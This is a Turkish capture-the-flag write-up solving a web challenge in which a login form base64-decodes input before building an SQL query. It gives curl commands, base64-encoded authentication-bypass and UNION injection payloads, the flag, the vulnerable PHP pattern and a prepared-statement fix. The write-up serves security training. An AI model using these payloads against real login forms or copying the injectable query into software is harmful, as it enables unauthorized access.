# 💉 injection2 - Web Challenge 

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-SQL Injection + Encoding-purple?style=for-the-badge" alt="SQL Injection">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 600

**Açıklama:** Agresif araçlara gerek yok!

**Challenge URL:** http://64.226.74.243:10002/

---

## 🔍 Analiz

**Hedef:** Login formunda encoding bypass yaparak SQL Injection zafiyetini kullanıp flag elde etmek

**Strateji:** Form analizi → Encoding keşfi → Base64 bypass → SQL Injection → Flag

**İpuçları:**
- 🎯 "Agresif araçlara gerek yok" → SQLMap gibi otomatik araçlar kullanmaya gerek yok
- 💉 "injection2" → SQL Injection zafiyeti var, ama bir twist var
- 🔐 Form sayfasında encoding ipucu var

---

## ✅ Çözüm Adımları

### 🔧 **Adım 1: Form Analizi - cURL ile Keşif**

**Terminalden HTTP response'u inceliyoruz:**

```bash
curl http://64.226.74.243:10002/
```

**Response:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Medium Login</title>
</head>
<body>
<h2>Login</h2>

<form method="POST">
    <input type="text" name="username" placeholder="username" required><br><br>
    <input type="text" name="password" placeholder="password" required><br><br>
    <button type="submit">Login</button>
</form>

<p><i>Hint: We do some encoding for your safety 😉</i></p>
</body>
</html>
```

**Form Analizi:**
- ✅ **Method:** POST
- ✅ **Parametreler:** `username` ve `password`
- 🔑 **ÖNEMLİ IPUCU:** "We do some encoding for your safety 😉"
- 💡 Uygulama girdileri encode ediyor

---

### 🧪 **Adım 2: Temel SQL Injection Testleri**

**Klasik payloadları deniyoruz:**

```bash
curl -X POST http://64.226.74.243:10002/ -d "username=' OR '1'='1" -d "password=test"
```

**Response:**

```html
<p>Login failed</p>
```

**Sonuç:** ❌ Çalışmadı - Encoding var!

---

### 🔍 **Adım 3: Encoding Tipini Keşfetme**

**UNION injection ile encoding tipini test ediyoruz:**

```bash
curl -X POST http://64.226.74.243:10002/ -d "username=' UNION SELECT NULL,NULL--" -d "password=test"
```

**Response:**

```html
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MySQL server version for the right syntax to use 
near '??^??(???' AND password = ''' at line 1
```

**Analiz:**
- ✅ SQL hatası aldık - iyi işaret!
- 🔍 `??^??(???` → Karakterler bozulmuş
- 💡 **Sonuç:** Uygulama girdileri **Base64 decode** ediyor!

---

### 💎 **Adım 4: Base64 Encoded SQL Injection - EXPLOIT!**

**Payload'ları Base64 ile encode ediyoruz:**

```bash
# Payload: admin' OR '1'='1'-- 
echo -n "admin' OR '1'='1'-- " | base64
# Output: YWRtaW4nIE9SICcxJz0nMSctLSA=

curl -X POST http://64.226.74.243:10002/ -d "username=YWRtaW4nIE9SICcxJz0nMSctLSA=" -d "password=test"
```

**🎉 BINGO! Response:**

```html
<h2>Login successful!</h2>
<pre>FLAG{base64_guvenli_degilmis_sqli64_success}</pre>
```

**✅ BAŞARILI!**

---

### 🧬 **Adım 5: Alternatif Başarılı Payloadlar**

**Tüm bunlar da çalışıyor:**

```bash
# Payload 1: ' OR 1=1-- 
echo -n "' OR 1=1-- " | base64
curl -X POST http://64.226.74.243:10002/ -d "username=JyBPUiAxPTEtLSA=" -d "password=test"
# ✅ FLAG!

# Payload 2: ' OR '1'='1
echo -n "' OR '1'='1" | base64
curl -X POST http://64.226.74.243:10002/ -d "username=JyBPUiAnMSc9JzE=" -d "password=test"
# ✅ FLAG!

# Payload 3: admin' OR '1'='1'#
echo -n "admin' OR '1'='1'#" | base64
curl -X POST http://64.226.74.243:10002/ -d "username=YWRtaW4nIE9SICcxJz0nMScj" -d "password=anything"
# ✅ FLAG!
```

---

### 🔬 **Bonus: UNION Injection ile Sütun Sayısı Keşfi**

**Tablo 3 sütunlu olduğunu keşfettik:**

```bash
# 1 sütun - HATA
echo -n "' UNION SELECT NULL-- " | base64
curl -X POST http://64.226.74.243:10002/ -d "username=JyBVTklPTiBTRUxFQ1QgTlVMTC0tIA==" -d "password=test"
# Error: different number of columns

# 2 sütun - HATA
echo -n "' UNION SELECT NULL,NULL-- " | base64
curl -X POST http://64.226.74.243:10002/ -d "username=JyBVTklPTiBTRUxFQ1QgTlVMTCxOVUxMLS0g" -d "password=test"
# Error: different number of columns

# 3 sütun - BAŞARILI! ✅
echo -n "' UNION SELECT NULL,NULL,NULL-- " | base64
curl -X POST http://64.226.74.243:10002/ -d "username=JyBVTklPTiBTRUxFQ1QgTlVMTCxOVUxMLE5VTEwtLSA=" -d "password=test"
# Login successful + FLAG!
```

---

## 🏁 **FLAG**

```
FLAG{base64_guvenli_degilmis_sqli64_success}
```

---

## 🧬 Teknik Analiz

### **Güvensiz Kod Akışı**

```php
// GÜVENSIZ KOD (Tahmini)
$username = base64_decode($_POST['username']);
$password = base64_decode($_POST['password']);

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $mysqli->query($query);
```

### **Exploit Akışı**

**1. Attacker payloadu base64 encode ediyor:**
```bash
Payload: admin' OR '1'='1'-- 
Base64:  YWRtaW4nIE9SICcxJz0nMSctLSA=
```

**2. Sunucu base64 decode yapıyor:**
```php
base64_decode("YWRtaW4nIE9SICcxJz0nMSctLSA=")
// Sonuç: admin' OR '1'='1'-- 
```

**3. Decode edilen payload doğrudan SQL sorgusuna gidiyor:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'-- ' AND password = ''
                                              ↑
                                   Burası her zaman TRUE!
                                   Password kontrolü yorum satırı!

# Gerçek çalışan sorgu:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

**Sonuç:**
- ✅ Password kontrolü atlandı
- ✅ OR '1'='1' her zaman TRUE döner
- ✅ Authentication bypass başarılı

---

## 🛡️ Nasıl Önlenir?

### **1. Prepared Statements (Kritik!)**

```php
// GÜVENLİ KOD
$username = base64_decode($_POST['username']);
$password = base64_decode($_POST['password']);

$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

### **2. Input Validation**

```php
// Base64 geçerlilik kontrolü
if (!base64_decode($_POST['username'], true)) {
    die("Invalid input");
}

// Sadece encoding YETERLI DEĞİL!
// Mutlaka prepared statements kullan!
```

**Önemli Nokta:**
- ❌ **Encoding ≠ Güvenlik**
- ✅ Base64 sadece encoding'dir, sanitizasyon değil
- ✅ Prepared statements kullanılmalı

---

## 🛠️ **Kullanılan Komutlar**

```bash
# İlk keşif
curl http://64.226.74.243:10002/

# Encoding testi
curl -X POST http://64.226.74.243:10002/ -d "username=' UNION SELECT NULL,NULL--" -d "password=test"

# Base64 payload oluşturma
echo -n "admin' OR '1'='1'-- " | base64

# EXPLOIT
curl -X POST http://64.226.74.243:10002/ -d "username=YWRtaW4nIE9SICcxJz0nMSctLSA=" -d "password=test"

# Sütun sayısı keşfi
echo -n "' UNION SELECT NULL,NULL,NULL-- " | base64
curl -X POST http://64.226.74.243:10002/ -d "username=JyBVTklPTiBTRUxFQ1QgTlVMTCxOVUxMLE5VTEwtLSA=" -d "password=test"
```

---

## 💭 **Çözüm Akışı**

```
🌐 injection2 Web Challenge
            ↓
🔧 Form analizi (curl)
   → POST method
   → username, password parametreleri
   → Hint: "We do some encoding for your safety"
            ↓
🧪 Temel SQL Injection
   → ' OR '1'='1 → BAŞARISIZ
   → Encoding var!
            ↓
🔍 Encoding keşfi
   → ' UNION SELECT → SQL hatası
   → ??^??(??? → Base64 decode!
            ↓
💎 Base64 Bypass
   → echo -n "admin' OR '1'='1'-- " | base64
   → YWRtaW4nIE9SICcxJz0nMSctLSA=
            ↓
💉 SQL Injection
   → Authentication bypass başarılı
            ↓
🏁 FLAG{base64_guvenli_degilmis_sqli64_success}
```
